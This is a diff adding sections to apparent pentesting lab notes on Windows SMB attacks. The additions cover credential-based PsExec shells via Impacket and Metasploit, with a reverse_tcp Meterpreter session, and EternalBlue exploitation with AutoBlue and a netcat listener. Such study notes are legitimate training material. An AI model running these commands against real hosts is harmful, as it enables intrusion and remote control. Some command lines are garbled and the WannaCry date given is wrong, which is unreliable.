@@ -6,6 +6,9 @@
 - [Windows Vulnerabilities](#Windows Vulnerabilities)
 - [Exploiting Windows Vulnerabilities](#Exploiting Windows Vulnerabilities)
   - Exploiting Microsoft IIS WebDAV
+  - Exploiting WebDAV With Metasploit
+  - Exploiting SMB With PsExec    
+  - Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)    
 
 - [Windows Privilege Escalation](#Windows Privilege Escalation)
 - [Windows File System Vulnerabilities](#Windows File System Vulnerabilities)
@@ -34,6 +37,7 @@ Microsoft Windows has various OS versions and releases which makes the threat su
 
 
 Regardless of the various versions and releases, all Windows OS’s share a likeness given the development model and philosophy:
+
 + Windows OS’s have been developed in the C programming language, making them vulnerable to buffer overflows, arbitrary code execution etc.
 + By default, Windows is not configured to run securely and require a proactive implementation of security practices in order to configure Windows to run securely.
 + Newly discovered vulnerabilities are not immediately patched by Microsoft and given the fragmented nature of Windows, many systems are left unpatched.
@@ -391,9 +395,291 @@ meterpreter >
 
 
 
+<br />
+
+---
+
+### SMB
+
+- SMB (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals (printers and serial ports) between computers on a local network (LAN).
+- SMB uses port 445 (TCP). However, originally, SMB ran on top of NetBIOS using port 139.
+- SAMBA is the open source Linux implementation of SMB, and allows Windows systems to access Linux shares and devices.
+- The SMB protocol utilizes two levels of authentication, namely:
+  - User authentication - Users must provide a username and password in order to authenticate with the SMB server in order to access a share.
+  - Share authentication - Users must provide a password in order to access restricted share.
+
+#### PsExec
+
+- PsExec is a lightweight telnet-replacement developed by Microsoft that allows you execute processes on remote windows systems using any user’s
+  credentials.
+- PsExec authentication is performed via SMB.
+- We can use the PsExec utility to authenticate with the target system legitimately and run arbitrary commands or launch a remote command
+  prompt.
+- It is very similar to RDP, however, instead of controlling the remote system via GUI, commands are sent via CMD.
+
+#### Exploiting SMB With PsExec    
+
+In order to utilize PsExec to gain access to a Windows target, we will need to identify legitimate user accounts and their respective passwords or password hashes. This can be done by leveraging various tools and techniques, however, the most common technique will involve performing an SMB login brute-force attack. We can narrow down our brute-force attack to only include common Windows user
+accounts like: Administrator.
+
+After we have obtained a legitimate user account and password, we can use the credentials to authenticate with the target system via PsExec and execute arbitrary system commands or obtain a reverse shell.
+
+<br />
+
+**Gather shares with smbmap**
+
+```bash
+root@attackdefense:~# smbmap -H 10.4.19.178 -u demo -p victoria
+[+] Finding open SMB ports....
+[+] User SMB session established on 10.4.19.178...
+[+] IP: 10.4.19.178:445	Name: 10.4.19.178                                       
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	admin                                             	NO ACCESS	
+	ADMIN$                                            	NO ACCESS	Remote Admin
+	C                                                 	READ, WRITE	
+	C$                                                	NO ACCESS	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	public                                            	READ, WRITE	
+
+root@attackdefense:~# smbmap -H 10.4.19.178 -u administrator -p qwertyuiop
+[+] Finding open SMB ports....
+[+] User SMB session established on 10.4.19.178...
+[+] IP: 10.4.19.178:445	Name: 10.4.19.178                                       
+	Disk                                                  	Permissions	Comment
+	----                                                  	-----------	-------
+	admin                                             	READ, WRITE	
+	ADMIN$                                            	READ, WRITE	Remote Admin
+	C                                                 	READ, WRITE	
+	C$                                                	READ, WRITE	Default share
+	IPC$                                              	READ ONLY	Remote IPC
+	public                                            	READ, WRITE	
+
+```
+
+user `demo` does not have access to `	ADMIN$   ` while `administrator` has
+
+<br />
+
+```bash
+root@attackdefense:~# psexec.py administrator@10.4.19.178 cmd.exe
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.4.19.178.....
+[*] Found writable share admin
+[*] Uploading file UTFKeDZS.exe
+[*] Opening SVCManager on 10.4.19.178.....
+[*] Creating service bUwC on 10.4.19.178.....
+[*] Starting service bUwC.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.14393]
+(c) 2016 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+nt authority\system
+
+
+================================================================================================================================
+
+root@attackdefense:~# psexec.py administrator@10.4.19.178 ipconfig
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.4.19.178.....
+[*] Found writable share admin
+[*] Uploading file htKsTxhZ.exe
+[*] Opening SVCManager on 10.4.19.178.....
+[*] Creating service WeAE on 10.4.19.178.....
+[*] Starting service WeAE.....
+[!] Press help for extra shell commands
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet 3:
+
+   Connection-specific DNS Suffix  . : ec2.internal
+   Link-local IPv6 Address . . . . . : fe80::55c2:45f5:a88b:6213%8
+   IPv4 Address. . . . . . . . . . . : 10.4.19.178
+   Subnet Mask . . . . . . . . . . . : 255.255.240.0
+   Default Gateway . . . . . . . . . : 10.4.16.1
+
+Tunnel adapter isatap.ec2.internal:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : ec2.internal
+
+Tunnel adapter Local Area Connection* 3:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : 2001:0:34f1:8072:2467:b54:f5fb:ec4d
+   Link-local IPv6 Address . . . . . : fe80::2467:b54:f5fb:ec4d%7
+   Default Gateway . . . . . . . . . : ::
+[*] Process ipconfig finished with ErrorCode: 0, ReturnCode: 0
+[*] Opening SVCManager on 10.4.19.178.....
+[*] Stopping service WeAE.....
+[*] Removing service WeAE.....
+[*] Removing file htKsTxhZ.exe.....
+
+================================================================================================================================
+if the user does not have wriable share
+
+root@attackdefense:~# psexec.py demo@10.4.19.178 cmd.exe
+Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
+
+Password:
+[*] Requesting shares on 10.4.19.178.....
+[-] share 'admin' is not writable.
+[-] share 'ADMIN$' is not writable.
+[-] share 'C' is not writable.
+[-] share 'C$' is not writable.
+[*] Found writable share public
+[*] Uploading file RxmlsLpn.exe
+[*] Opening SVCManager on 10.4.19.178.....
+[-] Error opening SVCManager on 10.4.19.178.....
+[-] Error performing the installation, cleaning up: Unable to open SVCManager
+
+```
+
+utilizing smb credentials to login remotely with PSexec
+
+<br />
+
+**exploit smb psexec using metasploit `windows/smb/psexec`**
+
+```bash
+msf5 auxiliary(scanner/smb/smb_login) > use exploit/windows/smb/psexec
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf5 exploit(windows/smb/psexec) > options
+
+Module options (exploit/windows/smb/psexec):
+
+   Name                  Current Setting  Required  Description
+   ----                  ---------------  --------  -----------
+   RHOSTS                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT                 445              yes       The SMB service port (TCP)
+   SERVICE_DESCRIPTION                    no        Service description to to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                   no        The service display name
+   SERVICE_NAME                           no        The service name
+   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                no        The Windows domain to use for authentication
+   SMBPass                                no        The password for the specified username
+   SMBUser                                no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.22.2       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+msf5 exploit(windows/smb/psexec) > set RHOSTS 10.4.19.178
+RHOSTS => 10.4.19.178
+msf5 exploit(windows/smb/psexec) > set SMBUSER administrator
+SMBUSER => administrator
+msf5 exploit(windows/smb/psexec) > set SMBPASS qwertyuiop
+SMBPASS => qwertyuiop
+msf5 exploit(windows/smb/psexec) > run
+
+[*] Started reverse TCP handler on 10.10.22.2:4444 
+[*] 10.4.19.178:445 - Connecting to the server...
+[*] 10.4.19.178:445 - Authenticating to 10.4.19.178:445 as user 'administrator'...
+[*] 10.4.19.178:445 - Selecting PowerShell target
+[*] 10.4.19.178:445 - Executing the payload...
+[+] 10.4.19.178:445 - Service start timed out, OK if running a command or non-service executable...
+[*] Sending stage (176195 bytes) to 10.4.19.178
+[*] Meterpreter session 1 opened (10.10.22.2:4444 -> 10.4.19.178:49818) at 2024-01-14 15:56:10 +0530
+
+meterpreter > 
+
+```
+
+<br />
 
 
 
+#### Exploiting Windows MS17-010 SMB Vulnerability (EternalBlue)    
+
+- EternalBlue (MS17-010/CVE-2017-0144) is the name given to a collection of Windows vulnerabilities and exploits that allow attackers to remotely execute arbitrary code and gain access to a Windows system and consequently the network that the target system is a part of.
+- The EternalBlue exploit was developed by the NSA (National Security Agency) to take advantage of the MS17-010 vulnerability and was leaked to the public by a hacker group called the Shadow Brokers in 2017.
+- The EternalBlue exploit takes advantage of a vulnerability in the Windows SMBv1 protocol that allows attackers to send specially crafted packets that consequently facilitate the execution of arbitrary commands.
+- The EternalBlue exploit was used in the WannaCry ransomware attack on June 27, 2017 to exploit other Windows systems across networks with the objective of spreading the ransomware to as many systems as possible.
+- This vulnerability affects multiple versions of Windows:
+  ○ Windows Vista
+  ○ Windows 7
+  ○ Windows Server 2008
+  ○ Windows 8.1
+  ○ Windows Server 2012
+  ○ Windows 10
+  ○ Windows Server 2016
+- Microsoft released a patch for the vulnerability in March, 2017, however, many users and companies have still not yet patched their systems.
+- The EternalBlue exploit has a MSF auxiliary module that can be used to check if a target system if vulnerable to the exploit and also has an exploit module that can be used to exploit the vulnerability on unpatched systems.
+- The EternalBlue exploit module can be used to exploit vulnerable Windows systems and consequently provide us with a privileged meterpreter session on the target system.
+- In addition to MSF modules, we can also manually exploit the vulnerability by utilizing publicly available exploit code.
+  - AutoBlue-MS17-010: https://github.com/3ndG4me/AutoBlue-MS17-010
+
+<br />
+
+**detect MS17-010 SMB (EternalBlue) with nmap    **
+
+```bash
+root@attackdefense:~# nmap 10.0.0.2 -sV -p445 --script=smb-vuln-ms17-010
+```
+
+<br />
+
+**exploite MS17-010 SMB (EternalBlue) with [3ndG4me/AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010) **
+
+```bash
+root@attackdefense:~# git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
+root@attackdefense:~# cd AutoBlue-MS17-010/shellcode
+root@attackdefense:~# chmod +x shell_prep.sh
+root@attackdefense:~# ./ shell_prep.sh
+root@attackdefense:~# LHOST
+root@attackdefense:~# 1234 => 	LPORT
+root@attackdefense:~# 1 => 		cmd shell
+root@attackdefense:~# 1 => 		stageless payload
+
+
+set netcat listener
+root@attackdefense:~# nc -nvlp 1234 
+root@attackdefense:~# LPORT
+
+
+root@attackdefense:~# chmod +x eternalblue_exploit7.py  (it debends on the victim's windows version)
+root@attackdefense:~# python eternalblue_exploit7.py LHOST(ip) shellcode/sc_64.bin
+```
+
+<br />
+
+**detect MS17-010 SMB (EternalBlue) with metasploit **
+
+```bash
+msf5 > use auxiliary/scanner/smb/smb_ms17_010
+```
+
+
+
+<br />
+
+**exploite MS17-010 SMB (EternalBlue) with metasploit **
+
+```bash
+msf5 > exploit/windows/smb/ms17_010_eternalblue
+```
+
+<br />
 
 **References**
 
